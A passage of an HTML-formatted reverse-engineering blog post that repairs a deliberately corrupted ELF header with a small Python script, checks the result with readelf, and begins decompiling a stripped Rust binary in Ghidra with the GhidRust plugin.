class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> struct\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> repair_elf_header\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(filepath):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"\"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    Repairs the e_phoff field in a corrupted ELF header.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"\"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    # The e_phoff field is at offset 0x20 (32) in a 64-bit ELF file.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    E_PHOFF_OFFSET\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">20\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    # The correct value is 64, since the program headers start\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    # right after the 64-byte ELF header.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    CORRECT_VALUE\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    try\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        with\u003C/span>\u003Cspan style=\"color:#79B8FF\"> open\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(filepath, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"r+b\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> f:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            # Go to the location of e_phoff\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            f.seek(\u003C/span>\u003Cspan style=\"color:#79B8FF\">E_PHOFF_OFFSET\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            # Write the correct 64-bit integer value (64) in little-endian format\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            f.write(struct.pack(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'&#x3C;Q'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">CORRECT_VALUE\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">            print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[+] Successfully patched '\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">filepath\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'.\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">            print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[*] Wrote value \u003C/span>\u003Cspan style=\"color:#79B8FF\">{CORRECT_VALUE}\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> to offset \u003C/span>\u003Cspan style=\"color:#79B8FF\">{hex\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">E_PHOFF_OFFSET\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">.\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    except\u003C/span>\u003Cspan style=\"color:#79B8FF\"> Exception\u003C/span>\u003Cspan style=\"color:#F97583\"> as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> e:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[!] An error occurred: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">e\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">():\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#79B8FF\"> len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(sys.argv) \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Usage: python \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">sys.argv[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> &#x3C;path_to_mangled_binary>\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sys.exit(\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    filepath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sys.argv[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#F97583\"> not\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> os.path.exists(filepath):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[!] File not found: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">filepath\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sys.exit(\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    repair_elf_header(filepath)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#79B8FF\"> __name__\u003C/span>\u003Cspan style=\"color:#F97583\"> ==\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"__main__\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    main()\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Running readelf again gives us\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                                                                      21:12:47\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">ELF\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Header:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Magic:\u003C/span>\u003Cspan style=\"color:#9ECBFF\">   7f\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 45\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 4c\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 46\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 02\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 01\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 01\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Class:\u003C/span>\u003Cspan style=\"color:#9ECBFF\">                             ELF64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">  Data:\u003C/span>\u003Cspan style=\"color:#79B8FF\">                              2\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'s complement, little endian\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Version:                           1 (current)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  OS/ABI:                            UNIX - System V\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  ABI Version:                       0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Type:                              DYN (Position-Independent Executable file)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Machine:                           Advanced Micro Devices X86-64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Version:                           0x1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Entry point address:               0xf250\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Start of program headers:          64 (bytes into file)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Start of section headers:          523080 (bytes into file)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Flags:                             0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Size of this header:               64 (bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Size of program headers:           56 (bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Number of program headers:         14\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Size of section headers:           64 (bytes)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Number of section headers:         32\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">  Section header string table index: 31\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Now we can start running the binary again , to see it’s true behaviour\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>./rust_vm_poc                                                                               \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Execution finished.\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Ghidra provides a powerful static analysis environment that makes reverse engineering faster and less error prone. Its decompiler translates assembly into readable C-like pseudocode, which greatly speeds up understanding control flow and data manipulation compared to reading raw disassembly. To make reverse engineering even easier for Rust binaries, the GhidRust plugin can be integrated. GhidRust \u003Ca href=\"https://github.com/DMaroo/GhidRust\">GhidRust GitHub repository\u003C/a> is designed specifically for Rust-compiled executables: it can identify Rust binaries, apply function signatures from the Rust standard library to stripped binaries, and assist in decompilation by emitting more readable pseudocode that resembles Rust code\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/havok-engine-reverse-engineering/image-12.png\" alt=\"Ghidra entry function analysis\">\u003C/p>\n\u003Cp>In the entry function we can see that\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    0010f26f\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ff\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 15\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 2b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">        CALL\u003C/span>\u003Cspan style=\"color:#9ECBFF\">       qword\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ptr\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [->&#x3C;EXTERNAL>::__libc_start_main]      undefined \u003C/span>\u003Cspan style=\"color:#B392F0\">__libc_start_main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                 fd\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 06\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 00\u003C/span>\u003Cspan style=\"color:#9ECBFF\">                                                                    =\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 001802d8\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>So this instruction is the usual way position independent executables call external library functions: the call goes through a GOT entry so the dynamic loader can patch it to the real address.\u003C/p>\n\u003Cp>Also we see a main : ) So thats something , all the functions from the symbol table have been stripped so we manually have to trace back each call ’\u003C/p>\n\u003Cp>Lets take a look at main\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">/* WARNING: Type propagation algorithm not settling */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">undefined8 \u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_001125b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#FFAB70\">param_1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,undefined8 \u003C/span>\u003Cspan style=\"color:#FFAB70\">param_2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  uint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> uVar1;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  void\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">pvVar2;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  int\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">piVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  long\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  int\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> iVar5;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  pollfd \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ppVar6;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">  __sighandler_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> p_Var7;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong uVar8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  pthread_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> __th;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  long\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  undefined4 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">puVar10;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  long\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar11;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  int\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">piVar12;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  int\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">piVar13;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  undefined8 uVar14;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong uVar15;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  undefined \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ppuVar16;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  int\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">piVar17;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  pollfd \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">__fds;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  code \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">pcVar18;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  long\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> in_FS_OFFSET;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  bool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> bVar19;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  int\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> local_118;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  int\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> local_114;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  void\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_110;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  pthread_attr_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> local_108;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong uStack_d0;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong local_c8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong uStack_c0;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong local_b8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong uStack_b0;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong local_a8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong uStack_a0;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong local_98;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong uStack_90;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  ulong local_88;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  undefined8 uStack_80;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  _func_5327 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_78;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  size_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> local_68;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  undefined8 local_60 [\u003C/span>\u003Cspan style=\"color:#79B8FF\">6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  piVar17 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_118;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  local_108.__align._0_4_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  local_108.__align._4_2_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  local_108.__align._6_2_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  local_108._8_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  local_108._16_8_ \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  __fds \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (pollfd \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">local_108;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  pcVar18 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> poll;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">  do\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> poll\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(__fds,\u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (iVar5 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">      if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((((local_108.__align \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">20000000000000\u003C/span>\u003Cspan style=\"color:#F97583\">U\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">          (iVar5 \u003C/span>\u003Cspan 